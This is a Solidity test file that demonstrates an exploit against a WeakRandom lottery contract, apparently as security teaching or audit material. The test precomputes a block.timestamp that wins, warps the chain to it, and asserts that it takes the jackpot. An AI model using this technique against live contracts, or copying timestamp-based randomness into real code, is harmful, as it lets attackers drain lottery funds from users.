// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/WeakRandom.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function warp(uint256 newTimestamp) external;
}

contract WeakRandomTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    WeakRandom lottery;

    function setUp() public {
        lottery = new WeakRandom{value: 5 ether}();
        vm.deal(address(this), 2 ether);
    }

    function testPredictableTimestampJackpot() public {
        // Find a timestamp where keccak256(timestamp, this) % 10 == 0
        uint256 winningTime = 0;
        for (uint256 t = 1000; t < 1100; t++) {
            if (uint256(keccak256(abi.encodePacked(t, address(this)))) % 10 == 0) {
                winningTime = t;
                break;
            }
        }
        require(winningTime > 0, "No winning timestamp found in window");

        vm.warp(winningTime);
        uint256 balBefore = address(this).balance;
        lottery.play{value: 0.1 ether}();
        require(address(this).balance > balBefore, "Timestamp exploit: jackpot won via precalculated block.timestamp");
        require(lottery.lastWinner() == address(this), "Winner set to attacker");
    }

    receive() external payable {}
}
